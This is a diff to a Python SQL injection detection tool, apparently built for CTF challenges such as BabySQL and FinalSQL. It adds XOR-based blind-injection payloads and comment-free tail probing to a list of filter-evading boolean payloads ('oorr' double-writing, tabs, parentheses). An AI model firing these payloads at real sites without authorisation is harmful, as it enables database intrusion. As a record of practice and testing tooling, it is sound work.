@@ -15,6 +15,7 @@ MARKER_PREFIX = "asq"          # 回显位标记前缀，尽量避开常见词
 
 # (形态名, 恒真核心, 恒假核心)——and 适用查询框，or 适用登录框（恒真=登录成功）
 # orinject：关键字被 str_replace 剥离的环境（BabySQL），oorr 双写还原
+# xor：and/or/空格/注释全被滤的异或盲注（FinalSQL：1^(1=1) 真→id 变化）
 BOOL_FORMS = [
     ("classic", " and 1=1", " and 1=2"),
     ("paren",   "and(1=1)", "and(1=2)"),
@@ -26,6 +27,7 @@ BOOL_FORMS = [
     ("tab",     "\tor\t1=1", "\tor\t1=2"),
     ("orinject", "oorr 1=1", "oorr 1=2"),
     ("orinject", "aornd 1=1", "aornd 1=2"),
+    ("xor",     "^(1=1)", "^(1=2)"),
 ]
 
 
@@ -83,8 +85,9 @@ class Detector:
         """验证当前 form 是否有真假差异；没有则遍历 BOOL_FORMS 升级。"""
         pre = inj.base_value if inj.numeric else inj.base_value + inj.closure
         for form, t_core, f_core in BOOL_FORMS:
-            t = self._send(f"{pre}{t_core}#")
-            f = self._send(f"{pre}{f_core}#")
+            tail = "" if inj.numeric else "#"
+            t = self._send(f"{pre}{t_core}{tail}")
+            f = self._send(f"{pre}{f_core}{tail}")
             if t.status_code < 0 or f.status_code < 0:
                 continue
             if self._differs(t, f) and \
@@ -134,9 +137,10 @@ class Detector:
         """数字型判定：and 1=1 / and 1=2 页面差异（多形态，空格被滤时用 inline/paren/tab）。"""
         for form, t_core, f_core in BOOL_FORMS:
             if t_core.lstrip().lower().startswith(("or", "oorr")):
-                continue    # 数字型判定用 and 语义（真=基线）
-            t = self._send(f"{self.s.spec.base_value}{t_core}#")
-            f = self._send(f"{self.s.spec.base_value}{f_core}#")
+                continue    # 数字型判定用 and/xor 语义（真=基线或翻转）
+            # 数字型表达式自然结束，无需注释符（FinalSQL 类 # 被滤环境）
+            t = self._send(f"{self.s.spec.base_value}{t_core}")
+            f = self._send(f"{self.s.spec.base_value}{f_core}")
             if t.status_code < 0 or f.status_code < 0:
                 continue
             if not self._differs(t, f):
@@ -152,40 +156,48 @@ class Detector:
         return similarity(a, b) < 0.995 or a.status_code != b.status_code
 
     # ------------------------------------------------------------------ comment
+    def _form_cores(self, inj: InjectionPoint):
+        """当前形态对应的恒真/恒假核心（xor 等 joiner 特化）。"""
+        rows = [(t, f) for fm, t, f in BOOL_FORMS if fm == inj.form]
+        if rows:
+            return rows[0]
+        return (" and 1=1", " and 1=2")
+
     def _probe_comment(self, inj: InjectionPoint) -> str:
-        """探测尾部处理方式，返回最优 comment（含 quote-close）。
-        探针按已命中的 form 变换（空格被滤时自动无空格化）。"""
+        """探测尾部处理方式，返回最优 comment（含 quote-close / none）。
+        none：数字型 + 表达式自然自闭合（FinalSQL 类 # 被滤环境）。"""
         base = inj.base_value
         pre = base if inj.numeric else base + inj.closure
-        forms = [("", " and 1=1")]
-        if inj.form != "classic":
-            forms = [(inj.form, " and 1=1")]
+        t_core, f_core = self._form_cores(inj)
         candidates = [
-            ("#",        " and 1=1#"),
-            ("-- ",      " and 1=1-- "),
-            ("quote-close", None),
+            ("#", "#"),
+            ("-- ", "-- "),
+            ("none", ""),          # 无注释（数字型表达式自然结束）
+            ("quote-close", None),  # 引号闭合（仅字符串型）
         ]
-        for name, core in candidates:
-            for form, _ in forms:
-                if name == "quote-close":
-                    if inj.numeric:
-                        continue
-                    payload = apply_form(" and '1'='1", form)
-                    payload = f"{pre}{payload}"
-                else:
-                    payload = f"{pre}{apply_form(core, form)}"
-                t = self._send(payload)
-                f = self._send(payload.replace("1=1", "1=2").replace("'1'='1", "'1'='2"))
-                if t.status_code < 0 or f.status_code < 0:
+        for name, tail in candidates:
+            if name == "quote-close":
+                if inj.numeric:
                     continue
-                if self._same_as_base(t, 0.9) and self._differs(t, f):
-                    self.log("INFO", f"注释/收尾方式可用: {name!r}")
-                    return name
+                core_t = " or '1'='1"
+                core_f = " or '1'='2"
+                payload = f"{pre}{apply_form(core_t, inj.form)}"
+                payload_f = f"{pre}{apply_form(core_f, inj.form)}"
+            else:
+                payload = f"{pre}{apply_form(t_core, inj.form)}{tail}"
+                payload_f = f"{pre}{apply_form(f_core, inj.form)}{tail}"
+            t = self._send(payload)
+            f = self._send(payload_f)
+            if t.status_code < 0 or f.status_code < 0:
+                continue
+            if self._same_as_base(t, 0.9) and self._differs(t, f):
+                self.log("INFO", f"注释/收尾方式可用: {name!r}")
+                return name
         # or 变体再试（and 可能被过滤）
         if not inj.numeric:
             for name in ("#", "quote-close"):
                 core_or = " or 1=1#" if name == "#" else " or '1'='1"
-                for form, _ in forms:
+                for form in [inj.form]:
                     payload = f"{pre}{apply_form(core_or, form)}"
                     t = self._send(payload)
                     f = self._send(payload.replace("1=1", "1=2").replace("'1'='1", "'1'='2"))
@@ -199,7 +211,7 @@ class Detector:
     def _probe_bool(self, inj: InjectionPoint):
         """记录布尔差异标记，供盲注使用。"""
         pre = inj.base_value if inj.numeric else inj.base_value + inj.closure
-        tail = inj.comment if inj.comment != "quote-close" else ""
+        tail = inj.comment if inj.comment not in ("quote-close", "none") else ""
         t = self._send(f"{pre}{apply_form(' and 1=1', inj.form)}{tail}")
         f = self._send(f"{pre}{apply_form(' and 1=2', inj.form)}{tail}")
         inj.bool_markers = {"true_len": t.length, "false_len": f.length,
